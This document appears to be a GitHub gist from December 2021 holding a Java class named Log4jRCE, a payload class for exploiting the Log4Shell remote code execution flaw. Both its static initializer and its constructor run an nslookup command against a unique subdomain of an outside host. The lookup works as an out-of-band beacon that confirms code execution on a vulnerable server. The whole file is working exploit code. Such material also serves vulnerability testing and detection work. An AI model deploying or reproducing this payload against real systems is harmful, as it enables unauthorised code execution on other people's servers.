//date: 2021-12-10T17:11:43Z
//url: https://api.github.com/gists/c38e40e137adf801b9fcc38b38508817
//owner: https://api.github.com/users/v1stra

// Built with 8u131
// https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
public class Log4jRCE {

    static {
        try {
            String[] cmd = {"nslookup", "c6pnps38tum45r45bjb0cg3z3heyyyyyn.v1x.us"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Log4jRCE(){
        try {
            String[] cmd = {"nslookup", "c6pnps38tum45r45bjb0cg3z3heyyyyyn.v1x.us"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}